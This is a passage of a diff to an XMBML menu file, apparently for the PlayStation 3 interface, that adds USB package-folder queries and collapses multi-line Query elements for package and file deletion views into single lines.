+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb2" src="host://localhost/q?path=/dev_usb002&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb3" src="host://localhost/q?path=/dev_usb003&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb4" src="host://localhost/q?path=/dev_usb004&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb5" src="host://localhost/q?path=/dev_usb005&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb6" src="host://localhost/q?path=/dev_usb006&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb7" src="host://localhost/q?path=/dev_usb007&suffix=.pkg&subclass=x-host/package"/>
 		</Items>
 	</View>
 
@@ -1007,11 +716,7 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_package_files_delete" attr="seg_package_files_delete"
-				src="#seg_delete_package"
-				/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_package_files_delete" attr="seg_package_files_delete" src="#seg_delete_package"/>
 		</Items>
 	</View>
 
@@ -1098,11 +803,7 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="host_device" attr="host_device"
-				src="#seg_delete_files_hdd0_path"
-			/>
+			<Query class="type:x-xmb/folder-pixmap" key="host_device" attr="host_device" src="#seg_delete_files_hdd0_path"/>
 		</Items>
 	</View>
 
@@ -1115,7 +816,7 @@
 		</Items>
 	</View>
 
-		<View id="seg_delete_files_usb">
+	<View id="seg_delete_files_usb">
 		<Attributes>
 			<Table key="host_device">
 				<Pair key="icon_rsc"><String>tex_album_icon</String></Pair>
@@ -1128,11 +829,7 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="host_device" attr="host_device"
-				src="#seg_delete_usb_path"
-			/>
+			<Query class="type:x-xmb/folder-pixmap" key="host_device" attr="host_device" src="#seg_delete_usb_path"/>
 		</Items>
 	</View>
 
@@ -1167,11 +864,7 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="host_device" attr="host_device"
-				src="#seg_delete_files_og_path"
-			/>
+			<Query class="type:x-xmb/folder-pixmap" key="host_device" attr="host_device" src="#seg_delete_files_og_path"/>
 		</Items>
 	</View>
 
@@ -1192,5 +885,4 @@
 			<Query class="type:x-xmb/xmlpackagefolder" key="pkg_files_cf"	src="host://localhost/q?path=/dev_cf&suffix=.pkg"/>
 		</Items>
 	</View>
-
 </XMBML>
